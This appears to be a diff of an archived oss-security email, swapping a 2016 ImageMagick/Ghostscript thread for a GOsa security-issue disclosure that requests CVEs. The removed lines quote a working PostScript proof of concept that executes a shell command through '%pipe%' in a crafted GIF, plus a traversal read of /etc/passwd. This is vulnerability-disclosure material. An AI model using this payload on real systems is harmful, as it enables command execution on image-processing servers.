@@ -1,39 +1,41 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/30/10
-Message-ID: <CAJ_zFkJnFQuTGgRzkPhAV1x+eBnh3r7sXSs=9OMNNVMDUDorRg@mail.gmail.com>
-Date: Fri, 30 Sep 2016 15:58:25 -0700
-From: Tavis Ormandy <taviso@...gle.com>
-To: Florian Weimer <fw@...eb.enyo.de>
-Cc: oss-security@...ts.openwall.com
-Subject: Re: ImageMagick identify "d:" hangs
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/01/15/4
+Message-ID: <20160115102631.Horde.lTAFZQ18vwx6AyvDNnMXTR9@mail.das-netzwerkteam.de>
+Date: Fri, 15 Jan 2016 10:26:31 +0000
+From: Mike Gabriel <mike.gabriel@...-netzwerkteam.de>
+To: oss-security@...ts.openwall.com
+Subject: Security issues in GOsa
 Content-Type: text/plain; charset=utf-8
 
-On Fri, Sep 30, 2016 at 2:11 PM, Florian Weimer <fw@...eb.enyo.de> wrote:
-> * Tavis Ormandy:
->>
->> $ cat test.gif
->> currentdevice null true mark /OutputICCProfile (%pipe%id > /dev/tty)
->> .putdeviceparams
->> quit
->> $ convert test.gif png:test.png
->>
->> (Note: I don't know why it doesn't work on earlier versions, maybe
->> it's possible to make it work, or some other param will work)
->
-> It still tries to open a file in earlier versions, with directory
-> traversal:
->
-> [pid 29607] open("/usr/share/ghostscript/9.06/iccprofiles/../../../../../etc/passwd", O_RDONLY) = 5
->
-> The %pipe%-based execution was introduced as a side effect of:
->
+Hi,
 
-Thanks Florian! I took a look where that directory comes from, I think
-it pulls it from a userparam, like:
+GOsa is a framework written in PHP for LDAP-based management of  
+intranet infrastructures.
 
-<< (ICCProfilesDir) (whatever) >> .setuserparams
+As part of upstream (I joined the team recently) I would like to make  
+you aware of (at least) two security issues +/- recently discovered:
 
-That probably needs to be fixed. I wonder if there's a way to get that
-directory to populate back into the PermitFileReading array?
+(1) Possibility of code injection when setting passwords for Samba.  
+Solved upstream:
+https://github.com/gosa-project/gosa-core/commit/a67a047cba2cdae8bccb0f0e2bc6d3eb45cfcbc8
 
-Tavis.
+(2) XSS vulnerability during session log on. Solved upstream:
+https://github.com/gosa-project/gosa-core/commit/e35b990464a2c2cf64d6833a217ed944876e7732
+
+Please assign individual CVE Ids for both issues, if appropriate.
+
+Thanks,
+Mike
+-- 
+
+DAS-NETZWERKTEAM
+mike gabriel, herweg 7, 24357 fleckeby
+fon: +49 (1520) 1976 148
+
+GnuPG Key ID 0x25771B31
+mail: mike.gabriel@...-netzwerkteam.de, http://das-netzwerkteam.de
+
+freeBusy:
+https://mail.das-netzwerkteam.de/mailxchange/kronolith/fb.php?u=m.gabriel%40das-netzwerkteam.de
+
+Content of type "application/pgp-signature" skipped
